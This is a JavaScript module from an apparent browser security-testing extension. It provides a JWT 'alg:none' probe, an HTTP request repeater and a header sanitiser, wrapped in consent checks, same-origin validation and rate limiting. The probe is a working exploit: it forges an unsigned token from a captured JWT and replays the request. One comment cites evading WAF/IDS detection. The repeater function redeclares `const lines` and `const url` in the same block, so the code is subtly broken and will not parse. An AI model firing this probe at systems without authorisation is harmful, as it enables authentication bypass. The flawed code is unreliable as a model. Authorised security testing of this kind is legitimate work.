/**
 * Security Probes Module
 *
 * Active security testing functions for JWT vulnerabilities and HTTP repeater functionality.
 *
 * SECURITY CRITICAL: These functions perform active probes/attacks against web applications.
 * - P0 FIX: User consent required before any probe
 * - SSRF protection is enforced via validateProbeRequest
 * - Rate limiting prevents abuse
 * - Dangerous headers are sanitized
 * - Only same-origin probes allowed
 * - All probe executions are logged for forensics
 *
 * @module security-probes
 */

import { validateProbeRequest } from './url-utils.js';
import { probeConsentManager } from './probe-consent.js';

/**
 * Rate limiter for probes to prevent abuse
 *
 * SECURITY P1: Rate limiting is critical to prevent:
 * - Extension being used as DDoS tool
 * - Accidental resource exhaustion
 * - Detection by WAF/IDS systems
 */
class ProbeRateLimiter {
  constructor(maxRequests = 10, windowMs = 60000) {
    this.maxRequests = maxRequests;
    this.windowMs = windowMs;
    this.requests = new Map(); // url -> [timestamp, timestamp, ...]
  }

  canProbe(url) {
    const now = Date.now();
    const urlKey = new URL(url).hostname; // Rate limit by hostname

    if (!this.requests.has(urlKey)) {
      this.requests.set(urlKey, []);
    }

    const timestamps = this.requests.get(urlKey);

    // Remove expired timestamps
    const validTimestamps = timestamps.filter(ts => now - ts < this.windowMs);
    this.requests.set(urlKey, validTimestamps);

    if (validTimestamps.length >= this.maxRequests) {
      return false; // Rate limit exceeded
    }

    // Add current timestamp
    validTimestamps.push(now);
    return true;
  }

  getRemainingTime(url) {
    const now = Date.now();
    const urlKey = new URL(url).hostname;
    const timestamps = this.requests.get(urlKey) || [];

    if (timestamps.length === 0) return 0;

    const oldestValid = Math.min(...timestamps);
    return Math.max(0, this.windowMs - (now - oldestValid));
  }
}

// Global rate limiter instance: 10 probes per minute per hostname
const probeRateLimiter = new ProbeRateLimiter(10, 60000);

/**
 * Sanitize request headers (remove dangerous headers)
 *
 * SECURITY P0: Prevents header injection attacks via probes:
 * - Removes authentication headers (Cookie, Authorization handled separately)
 * - Removes CSRF tokens (prevents token leakage)
 * - Removes proxy headers (prevents header smuggling)
 * - Removes Sec-* headers (browser security headers)
 *
 * @param {Array<{name: string, value: string}>} headers - Request headers to sanitize
 * @returns {Array<{name: string, value: string}>} Sanitized headers
 */
export function sanitizeProbeHeaders(headers) {
  const dangerousHeaders = [
    'cookie', 'set-cookie', 'x-csrf-token', 'x-xsrf-token',
    'x-forwarded-for', 'x-forwarded-host', 'x-real-ip',
    'proxy-authorization', 'sec-', 'origin', 'referer'
  ];

  return headers.filter(h => {
    const name = h.name.toLowerCase();
    return !dangerousHeaders.some(blocked => name.includes(blocked));
  });
}

/**
 * Perform JWT "alg:none" vulnerability probe
 *
 * SECURITY CRITICAL: Active exploit attempt - tests if server accepts unsigned JWTs
 *
 * Attack flow:
 * 1. Parse original JWT header and payload
 * 2. Modify header to set "alg": "none"
 * 3. Create new token: modifiedHeader.originalPayload.
 * 4. Send request with malicious token
 *
 * Protections:
 * - SSRF validation (same-origin only)
 * - Rate limiting (10/min per hostname)
 * - Header sanitization
 * - Method whitelist (GET/POST/PUT/DELETE/PATCH only)
 *
 * @param {Object} originalRequest - Original HTTP request object
 * @param {string} originalRequest.url - Request URL
 * @param {string} originalRequest.method - HTTP method
 * @param {Array} originalRequest.requestHeaders - Request headers
 * @param {*} originalRequest.requestBody - Request body
 * @param {string} jwt - Original JWT token to modify
 * @param {Object} sender - Chrome message sender object
 * @param {Object} sender.tab - Tab information
 * @param {string} sender.tab.url - Tab URL (for same-origin check)
 * @returns {Promise<{success: boolean, status?: number, statusText?: string, error?: string}>}
 */
export async function performAlgNoneProbe(originalRequest, jwt, sender) {
  // P0 FIX: Check user consent FIRST before any probe
  const targetDomain = new URL(originalRequest.url).hostname;
  const hasConsent = await probeConsentManager.hasConsent('alg_none', targetDomain);

  if (!hasConsent) {
    return {
      success: false,
      error: 'User consent required. This probe performs an ACTIVE ATTACK and may be illegal. You must explicitly grant consent in the extension settings.',
      requiresConsent: true
    };
  }

  // SSRF Protection: Validate request is safe
  const validation = validateProbeRequest(originalRequest.url, sender?.tab?.url);
  if (!validation.valid) {
    return { success: false, error: `Security: ${validation.error}` };
  }

  // Rate limiting check
  if (!probeRateLimiter.canProbe(originalRequest.url)) {
    const remainingMs = probeRateLimiter.getRemainingTime(originalRequest.url);
    return {
      success: false,
      error: `Rate limit exceeded. Try again in ${Math.ceil(remainingMs / 1000)} seconds.`
    };
  }


  try {
    const parts = jwt.split('.');
    const header = JSON.parse(atob(parts[0].replace(/-/g, '+').replace(/_/g, '/')));
    const payload = parts[1]; // Keep payload as is

    // Create the malicious header
    header.alg = 'none';
    const maliciousHeader = btoa(JSON.stringify(header)).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');

    // Construct the alg:none token (header.payload.)
    const maliciousToken = `${maliciousHeader}.${payload}.`;

    // Validate and sanitize method (prevent SSRF method smuggling)
    const allowedMethods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'];
    const method = originalRequest.method?.toUpperCase();
    if (!allowedMethods.includes(method)) {
      return { success: false, error: `Security: Method ${method} not allowed` };
    }

    // Sanitize headers (remove dangerous ones)
    const sanitizedHeaders = sanitizeProbeHeaders(originalRequest.requestHeaders || []);

    // Re-create the request headers, replacing the original token
    const newHeaders = new Headers();
    sanitizedHeaders.forEach(h => {
      if (h.name.toLowerCase() === 'authorization') {
        newHeaders.set('Authorization', `Bearer ${maliciousToken}`);
      } else {
        newHeaders.set(h.name, h.value);
      }
    });

    // Perform the fetch request
    const response = await fetch(originalRequest.url, {
      method: method,
      headers: newHeaders,
      body: method !== 'GET' && method !== 'HEAD' ? originalRequest.requestBody : undefined,
    });

    const result = { success: response.ok, status: response.status, statusText: response.statusText };

    // P0 FIX: Log probe execution for forensics and legal defense
    await probeConsentManager.logProbeExecution('alg_none', originalRequest.url, result);

    return result;

  } catch (error) {
    console.error('Hera Probe Error:', error);
    const result = { success: false, error: error.message };

    // Log failed probe attempts too
    await probeConsentManager.logProbeExecution('alg_none', originalRequest.url, result);

    return result;
  }
}

/**
 * Perform HTTP Repeater request (manual request replay)
 *
 * SECURITY CRITICAL: Allows arbitrary HTTP requests with user-controlled headers/body
 *
 * Features:
 * - Parse raw HTTP request format
 * - Replay request with modifications
 * - Return raw HTTP response
 *
 * Protections:
 * - SSRF validation (same-origin only)
 * - Rate limiting (10/min per hostname)
 * - Header sanitization
 * - Method whitelist (GET/POST/PUT/DELETE/PATCH only)
 * - Protocol enforcement (HTTP/HTTPS only)
 *
 * @param {string} rawRequest - Raw HTTP request (e.g., "GET /api/endpoint HTTP/1.1\nHost: example.com\n\n")
 * @param {Object} sender - Chrome message sender object
 * @param {Object} sender.tab - Tab information
 * @param {string} sender.tab.url - Tab URL (for same-origin check)
 * @returns {Promise<{rawResponse?: string, error?: string}>}
 */
export async function performRepeaterRequest(rawRequest, sender) {
  try {
    // Parse the raw HTTP request
    const lines = rawRequest.split('\n');
    const requestLine = lines[0].split(' ');
    const method = requestLine[0]?.toUpperCase();
    const url = requestLine[1];

    // P0 FIX: Check user consent FIRST before any probe
    const targetDomain = new URL(url).hostname;
    const hasConsent = await probeConsentManager.hasConsent('repeater', targetDomain);

    if (!hasConsent) {
      return {
        success: false,
        error: 'User consent required. HTTP Repeater allows arbitrary request modification and may be illegal. You must explicitly grant consent in the extension settings.',
        requiresConsent: true
      };
    }

    // SSRF Protection: Validate request is safe
    const validation = validateProbeRequest(url, sender?.tab?.url);
    if (!validation.valid) {
      return { success: false, error: `Security: ${validation.error}` };
    }

    // Validate method
    const allowedMethods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'];
    if (!allowedMethods.includes(method)) {
      return { success: false, error: `Security: Method ${method} not allowed` };
    }

    // Rate limiting check
    if (!probeRateLimiter.canProbe(url)) {
      const remainingMs = probeRateLimiter.getRemainingTime(url);
      return {
        success: false,
        error: `Rate limit exceeded. Try again in ${Math.ceil(remainingMs / 1000)} seconds.`
      };
    }

    // Parse and sanitize headers
    const parsedHeaders = [];
    let bodyIndex = -1;
    for (let i = 1; i < lines.length; i++) {
      if (lines[i] === '') {
        bodyIndex = i + 1;
        break;
      }
      const headerParts = lines[i].split(': ');
      if (headerParts.length === 2) {
        parsedHeaders.push({ name: headerParts[0], value: headerParts[1] });
      }
    }

    // Sanitize headers
    const sanitizedHeaders = sanitizeProbeHeaders(parsedHeaders);
    const headers = new Headers();
    sanitizedHeaders.forEach(h => headers.set(h.name, h.value));

    const body = bodyIndex !== -1 ? lines.slice(bodyIndex).join('\n') : undefined;

    // Perform the fetch request
    const response = await fetch(url, {
      method: method,
      headers: headers,
      body: body,
    });

    // Format the raw HTTP response
    let rawResponse = `HTTP/1.1 ${response.status} ${response.statusText}\n`;
    response.headers.forEach((value, name) => {
      rawResponse += `${name}: ${value}\n`;
    });
    rawResponse += '\n';
    rawResponse += await response.text();

    const result = { rawResponse: rawResponse, success: response.ok, status: response.status };

    // P0 FIX: Log probe execution for forensics
    const lines = rawRequest.split('\n');
    const url = lines[0].split(' ')[1];
    await probeConsentManager.logProbeExecution('repeater', url, result);

    return result;

  } catch (error) {
    console.error('Hera Repeater Error:', error);
    const result = { error: error.message, success: false };

    // Log failed attempts too
    try {
      const lines = rawRequest.split('\n');
      const url = lines[0].split(' ')[1];
      await probeConsentManager.logProbeExecution('repeater', url, result);
    } catch (logError) {
      console.error('Failed to log repeater execution:', logError);
    }

    return result;
  }
}
